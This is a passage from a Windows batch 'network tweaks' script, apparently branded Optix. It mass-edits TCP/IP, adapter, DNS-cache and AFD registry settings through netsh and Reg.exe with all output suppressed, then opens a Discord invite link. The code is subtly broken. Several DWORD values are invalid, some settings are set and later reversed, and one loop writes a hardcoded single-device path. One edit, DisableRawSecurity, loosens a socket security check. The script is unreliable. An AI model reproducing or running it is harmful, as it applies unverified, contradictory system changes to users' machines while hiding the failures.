netsh int tcp set global fastopen=enabled > nul 2>&1
netsh int tcp set global ecncapability=disabled > nul 2>&1
netsh int tcp set global timestamps=disabled > nul 2>&1
netsh int tcp set global initialRto=2000 > nul 2>&1
netsh int tcp set global MinRto=300 > nul 2>&1
netsh int tcp set heuristics disabled > nul 2>&1
netsh int tcp set supplemental template=custom icw=10 > nul 2>&1
netsh int udp set global uro=enabled > nul 2>&1
netsh int ipv4 set global defaultcurhoplimit=64 > nul 2>&1
netsh int ipv6 set global defaultcurhoplimit=64 > nul 2>&1
netsh int isatap set state disabled > nul 2>&1


)
:: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: 
:: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: :: ::



echo Applying Registry tweaks
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d "16" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxConnectionsPerServer" /t REG_DWORD /d "16" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DisableTaskOffload" /t REG_DWORD /d "00000000" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableConnectionRateLimiting" /t REG_DWORD /d "00000000" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableDCA" /t REG_DWORD /d "" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUBHDetect" /t REG_DWORD /d "00000000" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUDiscovery" /t REG_DWORD /d "00000001" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableRSS" /t REG_DWORD /d "00000001" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableTCPA" /t REG_DWORD /d "00000001" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableWsd" /t REG_DWORD /d "00000000" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "IRPStackSize" /t REG_DWORD /d "0000001e" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxFreeTcbs" /t REG_DWORD /d "65535" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxHashTableSize" /t REG_DWORD /d "00010000" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxUserPort" /t REG_DWORD /d "65534" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SackOpts" /t REG_DWORD /d "00000001" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SizReqBuf" /t REG_DWORD /d "51319" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SynAttackProtect" /t REG_DWORD /d "00000001" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TCPNoDelay" /t REG_DWORD /d "00000001" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "Tcp1323Opts" /t REG_DWORD /d "00000001" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDataRetransmissions" /t REG_DWORD /d "4" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpAckFrequency" /t REG_DWORD /d "00000005" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "StrictTimeWaitSeqCheck" /t REG_DWORD /d "00000001" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DisableIPSourceRouting" /t REG_DWORD /d "00000008" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "KeepAliveInterval" /t REG_DWORD /d "000003e8" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpCreateAndConnectTcbRateLimitDepth" /t REG_DWORD /d "00000000" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TCPInitalRtt" /t REG_DWORD /d "00046325" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDupAcks" /t REG_DWORD /d "00000002" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpNumConnections" /t REG_DWORD /d "de7a" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpTimedWaitDelay" /t REG_DWORD /d "00000042d" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpFinWait2Delay" /t REG_DWORD /d "00000042d" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TCPDelAckTicks" /t REG_DWORD /d "00000001" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "IPAutoconfigurationEnabled" /t REG_DWORD /d "00000000" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DefaultTTL" /t REG_DWORD /d "38" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "DisableTaskOffload" /t REG_DWORD /d "00000000" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "EnableConnectionRateLimiting" /t REG_DWORD /d "00000000" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "EnableDCA" /t REG_DWORD /d "00000001" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "EnablePMTUBHDetect" /t REG_DWORD /d "00000000" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "EnablePMTUDiscovery" /t REG_DWORD /d "00000001" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "EnableRSS" /t REG_DWORD /d "00000001" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "EnableTCPA" /t REG_DWORD /d "00000001" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "EnableWsd" /t REG_DWORD /d "00000000" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "IRPStackSize" /t REG_DWORD /d "0000001e" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "MaxFreeTcbs" /t REG_DWORD /d "65535" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "MaxHashTableSize" /t REG_DWORD /d "00010000" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "MaxUserPort" /t REG_DWORD /d "65534" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "SackOpts" /t REG_DWORD /d "00000001" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "SizReqBuf" /t REG_DWORD /d "51319" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "SynAttackProtect" /t REG_DWORD /d "00000001" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "TCPNoDelay" /t REG_DWORD /d "00000001" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "Tcp1323Opts" /t REG_DWORD /d "00000001" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "TcpMaxDataRetransmissions" /t REG_DWORD /d "5" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "TcpAckFrequency" /t REG_DWORD /d "00000004" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "StrictTimeWaitSeqCheck" /t REG_DWORD /d "00000001" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "DisableIPSourceRouting" /t REG_DWORD /d "00000008" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "KeepAliveInterval" /t REG_DWORD /d "000003e8" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "TcpCreateAndConnectTcbRateLimitDepth" /t REG_DWORD /d "00000000" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "IPAutoconfigurationEnabled" /t REG_DWORD /d "00000000" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "TCPInitalRtt" /t REG_DWORD /d "00046325" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "TcpMaxDupAcks" /t REG_DWORD /d "00000002" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "TcpNumConnections" /t REG_DWORD /d "de7a" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "TcpTimedWaitDelay" /t REG_DWORD /d "00000042d" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "TcpFinWait2Delay" /t REG_DWORD /d "00000042d" /f >nul 2>&1
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "TCPDelAckTicks" /t REG_DWORD /d "00000001" /f >nul 2>&1
Reg.exe add "HKLM\System\ControlSet001\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0001" /v "MIMOPowerSaveMode" /t REG_SZ /d "3" /f > nul 2>&1
Reg.exe add "HKLM\System\ControlSet001\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0001" /v "PowerSavingMode" /t REG_SZ /d "0" /f > nul 2>&1
Reg.exe add "HKLM\System\ControlSet001\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0001" /v "EnableGreenEthernet" /t REG_SZ /d "0" /f > nul 2>&1
Reg.exe add "HKLM\System\ControlSet001\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0001" /v "*EEE" /t REG_SZ /d "0" /f > nul 2>&1
Reg.exe add "HKLM\System\ControlSet001\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0001" /v "PnPCapabilities" /t REG_DWORD /d "24" /f > nul 2>&1
Reg.exe add "HKLM\System\ControlSet001\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0001" /v "ulpmode" /t REG_SZ /d "0" /f > nul 2>&1
Reg.exe add "HKLM\System\ControlSet001\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0002" /v "MIMOPowerSaveMode" /t REG_SZ /d "3" /f > nul 2>&1
Reg.exe add "HKLM\System\ControlSet001\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0002" /v "PowerSavingMode" /t REG_SZ /d "0" /f > nul 2>&1
Reg.exe add "HKLM\System\ControlSet001\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0002" /v "EnableGreenEthernet" /t REG_SZ /d "0" /f > nul 2>&1
Reg.exe add "HKLM\System\ControlSet001\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0002" /v "*EEE" /t REG_SZ /d "0" /f > nul 2>&1
Reg.exe add "HKLM\System\ControlSet001\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0002" /v "PnPCapabilities" /t REG_DWORD /d "24" /f > nul 2>&1
Reg.exe add "HKLM\System\ControlSet001\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0002" /v "ulpmode" /t REG_SZ /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Microsoft\MSMQ\Parameters" /v "TCPNoDelay" /t REG_DWORD /d "1" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Psched" /v "NonBestEffortLimit" /t REG_DWORD /d "0" /f > nul 2>&1
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Psched" /v "TimerResolution" /t REG_DWORD /d "1" /f > nul 2>&1 
Reg.exe add "HKLM\System\CurrentControlSet\Services\TCPIP\QoS" /v "Do not use NLA" /t REG_DWORD /d "1" /f > nul 2>&1 
Reg.exe add "HKLM\System\CurrentControlSet\Services\TCPIP\ServiceProvider" /v "LocalPriority" /t REG_DWORD /d "4" /f > nul 2>&1
Reg.exe add "HKLM\System\CurrentControlSet\Services\TCPIP\ServiceProvider" /v "HostPriority" /t REG_DWORD /d "5" /f > nul 2>&1
Reg.exe add "HKLM\System\CurrentControlSet\Services\TCPIP\ServiceProvider" /v "DnsPriority" /t REG_DWORD /d "6" /f > nul 2>&1
Reg.exe add "HKLM\System\CurrentControlSet\Services\TCPIP\ServiceProvider" /v "netbtPriority" /t REG_DWORD /d "7" /f > nul 2>&1
Reg.exe add "HKLM\System\CurrentControlSet\Services\TCPIP\Parameters" /v "MaxUserPort" /t REG_DWORD /d "65534" /f > nul 2>&1 
Reg.exe add "HKLM\System\CurrentControlSet\Services\TCPIP\Parameters" /v "TcpMaxConnectRetransmissions" /t REG_DWORD /d "1" /f > nul 2>&1 
Reg.exe add "HKLM\System\CurrentControlSet\Services\TCPIP\Parameters" /v "DefaultTTL" /t REG_DWORD /d 64 /f > nul 2>&1 
Reg.exe add "HKLM\System\CurrentControlSet\Services\TCPIP\Parameters" /v "DisableTaskOffload" /t REG_DWORD /d "1" /f > nul 2>&1 
Reg.exe add "HKLM\System\CurrentControlSet\Services\TCPIP\Parameters" /v "DisableDynamicDiscovery" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKLM\System\CurrentControlSet\Services\TCPIP\Parameters" /v "EnablePMTUBDetect" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKLM\System\CurrentControlSet\Services\TCPIP\Parameters" /v "SackOpts" /t REG_DWORD /d "1" /f > nul 2>&1 
Reg.exe add "HKLM\System\CurrentControlSet\Services\TCPIP\Parameters" /v "DelayedAckFrequency" /t REG_DWORD /d "1" /f > nul 2>&1 
Reg.exe add "HKLM\System\CurrentControlSet\Services\TCPIP\Parameters" /v "DelayedAckTicks" /t REG_DWORD /d "1" /f > nul 2>&1 
Reg.exe add "HKLM\System\CurrentControlSet\Services\TCPIP\Parameters" /v "CongestionAlgorithm" /t REG_DWORD /d "1" /f > nul 2>&1 
Reg.exe add "HKLM\System\CurrentControlSet\Services\TCPIP\Parameters" /v "MultihopSets" /t REG_DWORD /d "15" /f > nul 2>&1 
Reg.exe add "HKLM\System\CurrentControlSet\Services\TCPIP\Parameters" /v "EnablePMTUDiscovery" /t REG_DWORD /d "1" /f > nul 2>&1
Reg.exe add "HKLM\System\CurrentControlSet\Services\TCPIP\Parameters" /v "EnableICMPRedirect" /t REG_DWORD /d "1" /f > nul 2>&1
Reg.exe add "HKLM\System\CurrentControlSet\Services\TCPIP\Parameters" /v "EnablePMTUBHDetect" /t REG_DWORD /d "1" /f > nul 2>&1
Reg.exe add "HKLM\System\CurrentControlSet\Services\TCPIP\Parameters" /v "TcpTimedWaitDelay" /t REG_DWORD /d "30" /f > nul 2>&1
Reg.exe add "HKLM\System\CurrentControlSet\Services\TCPIP\Parameters" /v "Tcp1323Opts" /t REG_DWORD /d "1" /f > nul 2>&1
Reg.exe add "HKLM\System\CurrentControlSet\Services\TCPIP\Parameters\Winsock" /v "UseDelayedAcceptance" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKLM\System\CurrentControlSet\Services\TCPIP\Parameters\Winsock" /v "MaxSockAddrLength" /t REG_DWORD /d "16" /f > nul 2>&1 
Reg.exe add "HKLM\System\CurrentControlSet\Services\TCPIP\Parameters\Winsock" /v "MinSockAddrLength" /t REG_DWORD /d "16" /f > nul 2>&1 
Reg.exe add "HKLM\System\CurrentControlSet\Services\Dnscache\Parameters" /v "NegativeCacheTime" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKLM\System\CurrentControlSet\Services\Dnscache\Parameters" /v "NegativeSOACacheTime" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKLM\System\CurrentControlSet\Services\Dnscache\Parameters" /v "NetFailureCacheTime" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKLM\System\CurrentControlSet\Services\Dnscache\Parameters" /v "EnableAutoDoh" /t REG_DWORD /d "2" /f > nul 2>&1 
Reg.exe add "HKLM\System\CurrentControlSet\Services\AFD\Parameters" /v "DoNotHoldNicBuffers" /t REG_DWORD /d "1" /f > nul 2>&1
Reg.exe add "HKLM\System\CurrentControlSet\Services\AFD\Parameters" /v "DynamicSendBufferDisable" /t REG_DWORD /d "0" /f > nul 2>&1 
Reg.exe add "HKLM\System\CurrentControlSet\Services\AFD\Parameters" /v "DisableRawSecurity" /t REG_DWORD /d "1" /f > nul 2>&1 
Reg.exe add "HKLM\System\CurrentControlSet\Services\AFD\Parameters" /v "NonBlockingSendSpecialBuffering" /t REG_DWORD /d "1" /f > nul 2>&1 
Reg.exe add "HKLM\System\CurrentControlSet\Services\AFD\Parameters" /v "IgnorePushBitOnReceives" /t REG_DWORD /d "1" /f > nul 2>&1 
Reg.exe add "HKLM\System\CurrentControlSet\Services\LanmanServer\Parameters" /v "IRPStackSize" /t REG_DWORD /d "50" /f > nul 2>&1
Reg.exe add "HKLM\System\CurrentControlSet\Services\LanmanServer\Parameters" /v "SizReqBuf" /t REG_DWORD /d "16384" /f > nul 2>&1
Reg.exe add "HKLM\System\CurrentControlSet\Services\LanmanServer\Parameters" /v "Size" /t REG_DWORD /d "3" /f > nul 2>&1



Powershell.exe Set-NetOffloadGlobalSetting -PacketCoalescingFilter disabled > nul 2>&1


for /f %%n in ('wmic path win32_networkadapter get PNPDeviceID ^| findstr /L "VEN_"') do (
Reg.exe add "HKLM\SYSTEM\ControlSet001\Enum\PCI\VEN_8086&DEV_1533&SUBSYS_00018086&REV_03\4&108abd8a&0&00E4\Device Parameters\Interrupt Management\Affinity Policy" /v "AssignmentSetOverride" /t REG_BINARY /d "02" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\ControlSet001\Enum\PCI\VEN_8086&DEV_1533&SUBSYS_00018086&REV_03\4&108abd8a&0&00E4\Device Parameters\Interrupt Management\Affinity Policy" /v "DevicePolicy" /t REG_DWORD /d "4" /f > nul 2>&1
Reg.exe add "HKLM\SYSTEM\ControlSet001\Enum\PCI\VEN_8086&DEV_1533&SUBSYS_00018086&REV_03\4&108abd8a&0&00E4\Device Parameters\Interrupt Management\MessageSignaledInterruptProperties" /v "MessageNumberLimit" /t REG_DWORD /d "256" /f > nul 2>&1
)

for /f %%a in ('reg query "HKLM\SYSTEM\ControlSet001\Control\Class\{4D36E972-E325-11CE-BFC1-08002bE10318}" /f "PCI\VEN_" /d /s^|Findstr HKEY_') do (
Reg.exe add %%a /v "TxIntDelay" /t REG_SZ /d "5" /f > nul 2>&1
Reg.exe add %%a /v "ulpmode" /t REG_SZ /d "0" /f > nul 2>&1

)

for /f "usebackq" %%c in (`reg query HKLM\SYSTEM\CurrentControlSet\Services\TCPIP\Parameters\Interfaces`) do (
Reg.exe add %%c /v "UseZeroBroadcast" /d "0" /t REG_DWORD /f > nul 2>&1
Reg.exe add %%c /v "IPAutoconfigurationEnabled" /d "0" /t REG_DWORD /f > nul 2>&1


echo Nagle's algorithm
for /f "tokens=3*" %%s in ('reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkCards" /f "ServiceName" /s^|findstr /i /l "ServiceName"') do (
	Reg.exe add "HKLM\System\CurrentControlSet\Services\TCPIP\Parameters\Interfaces\%%s" /v "TcpAckFrequency" /t REG_DWORD /d "1" /f
 	Reg.exe add "HKLM\System\CurrentControlSet\Services\TCPIP\Parameters\Interfaces\%%s" /v "TCPNoDelay" /t REG_DWORD /d "1" /f
 	Reg.exe add "HKLM\System\CurrentControlSet\Services\TCPIP\Parameters\Interfaces\%%s" /v "TcpDelAckTicks" /t REG_DWORD /d "0" /f
	Reg.exe add "HKLM\System\CurrentControlSet\Services\TCPIP\Parameters\Interfaces\%%s" /v "TcpInitialRTT" /t REG_DWORD /d "0" /f 
	Reg.exe add "HKLM\System\CurrentControlSet\Services\TCPIP\Parameters\Interfaces\%%s" /v "DeadGWDetectDefault" /t REG_DWORD /d "1" /f
	Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\%%s" /v "UseZeroBroadcast" /d "0" /t REG_DWORD /f
	Reg.exe add "HKLM\System\CurrentControlSet\Services\Psched\Parameters\Adapters\%%s" /v "NonBestEffortLimit" /t REG_DWORD /d "0" /f
) > nul 2>&1

timeout 1 >nul
cls
goto done

:fpsexpermiental
CLS
echo.
echo.
call :logo
echo.
echo.
echo %optixpremium%
echo. [97m
echo.
echo                                        SOON
echo.
echo.
echo                            -Press any key to continue-
pause >nul
goto start

:done
cls
echo.
echo.   
echo.
echo                                ^|\      _,,,---,,_
echo                          ZZZzz /,`.-'`'    -.  ;-;;,_
echo                               ^|,4-  ) )-,_. ,\ (  `'-'
echo                              '---''(_/--'  `-'\_)  
echo.
echo.
echo.
echo.
echo.
echo                         TWEAKS DONE PLEASE RESTART YOUR PC
echo.
timeout 3 >nul
start https://dsc.gg/optix
PAUSE >NUL
goto done
EXIT